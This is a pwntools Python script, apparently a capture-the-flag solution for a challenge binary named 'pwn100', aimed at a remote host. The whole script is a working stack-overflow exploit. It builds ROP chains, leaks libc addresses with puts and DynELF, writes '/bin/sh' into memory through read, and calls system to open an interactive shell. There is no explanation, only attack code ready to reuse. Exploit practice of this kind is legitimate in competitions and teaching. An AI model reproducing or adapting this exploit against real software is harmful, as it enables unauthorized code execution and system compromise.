from pwn import *

context.log_level = 'debug'

conn = remote('111.198.29.45', 59628)
# conn = process('./pwn100')
elf = ELF('./pwn100')

write_bin_rop_1 = 0x40075A
write_bin_rop_2 = 0x400740

bin_addr = 0x601000
read_addr = elf.got['read']

pop_rdi_ret = 0x400763
puts_addr = elf.plt['puts']

start_addr = 0x400550

BUFSIZE = 200 - 1

# we use sendline to send data thus plus another '\n' byte, so we just create 199 bytes

def leak(addr):
    payload = 'W' * (0x40 + 0x08)
    payload += p64(pop_rdi_ret)
    payload += p64(addr)
    payload += p64(puts_addr)
    payload += p64(start_addr)
    payload = payload.ljust(BUFSIZE, 'W')

    conn.sendline(payload)
    conn.recvuntil('bye~\n')

    # check everybyte we received

    up = ''
    content = ''
    count = 0
    while True:
        c = conn.recv(numb=1, timeout=0.5)
        count += 1
        if up == '\n' and c == '':
            content = content[:-1] + '\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    # log.info("%#x => %s" % (addr, (content or '').encode('hex')))
    return content

dyn = DynELF(leak, elf = elf)
sys_addr = dyn.lookup('system', 'libc')

log.info('system address:%s', hex(sys_addr))

payload = 'W' * (0x40 + 0x08)
payload += p64(write_bin_rop_1)
payload += p64(0) + p64(1) + p64(read_addr)
# we will let it read 9 bytes because the sendline issue
payload += p64(9) + p64(bin_addr) + p64(0)
payload += p64(write_bin_rop_2)
payload += (6 + 1) * p64(0x00)
payload += p64(start_addr)

# payload here has reached a length of 200 no need to add a payload

conn.send(payload)

conn.sendlineafter('bye~\n', '/bin/sh\x00')

payload = 'W' * (0x40 + 0x08)
payload += p64(pop_rdi_ret)
payload += p64(bin_addr)
payload += p64(sys_addr)
payload = payload.ljust(BUFSIZE, 'W')

conn.sendline(payload)

conn.interactive()